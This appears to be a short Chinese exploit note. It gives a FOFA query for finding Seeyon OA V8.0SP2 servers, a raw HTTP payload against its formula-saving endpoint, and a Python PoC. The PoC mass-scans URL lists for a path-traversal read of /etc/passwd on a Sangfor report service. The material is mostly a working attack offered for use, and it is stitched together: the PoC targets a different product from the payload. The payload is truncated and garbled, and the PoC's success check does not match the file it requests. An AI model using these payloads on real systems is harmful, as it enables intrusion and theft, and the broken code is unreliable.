fofa

```markdown
app=“致远互联-OA” && title=“V8.0SP2”
```

payload

```markdown
POST /seeyou/ajax.do?method=ajaxAction&managerName=formulaManager&managerMethod=saveFormula4C1oud HTTP/1.1
Host: 1.1.1.1
User-Agent: Cozilla/5.0 (Vindows Et 6.1; Sow64, rident/7.0; ry: 11.0)
Accept: text/html, image/gif, image/ipeg, */*; q=.2, */*; q=.2
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 522729
Connection: close
X-Forwarded-For: 1.2.3.4

arguments={"formulaName":"test","formulaAlias":"safe_pre","formulaType":"2","formulaExpression":",\"sample\",\"I"}
```

poc

```python
import argparse,requests
from multiprocessing.dummy import Pool
# banner信息
def banner():
    test = """
███████╗██████╗ ███╗   ███╗        ██████╗     ██████╗ 
██╔════╝██╔══██╗████╗ ████║        ╚════██╗   ██╔═████╗
███████╗██████╔╝██╔████╔██║         █████╔╝   ██║██╔██║
╚════██║██╔══██╗██║╚██╔╝██║        ██╔═══╝    ████╔╝██║
███████║██║  ██║██║ ╚═╝ ██║███████╗███████╗██╗╚██████╔╝
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ 
                                   author:@juyou
                                   date:2024-09-2
                                   version:1.0                    
"""
    print(test)

def poc(target):
    payload = '/report/download.php?pdf=../../../../../etc/passwd'
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        # "Accept": */*,
        "Connection": "Keep-Alive"
    }
    try:
        res1 = requests.get(url=target)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,headers=headers,verify=False,timeout=5)
            if '[fonts]' in res2.text:
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{target}存在任意文件读取\n")
            else:
                print(f"该{target}不存在任意文件读取")
        else:
            print(f"该{target}可能存在问题，请手工检测")
    except Exception as e:
        print(e)


def main():
    # 命令行是不是需要接收参数 url（单挑的检测） file（批量）
    # 实例化
    banner()
    parse = argparse.ArgumentParser(description="深信服报表 任意读取")

    parse.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parse.add_argument("-f","--file",dest="file",type=str,help="Please enter file")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                # url = url.strip()
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")

if __name__ == '__main__':
    main()
```

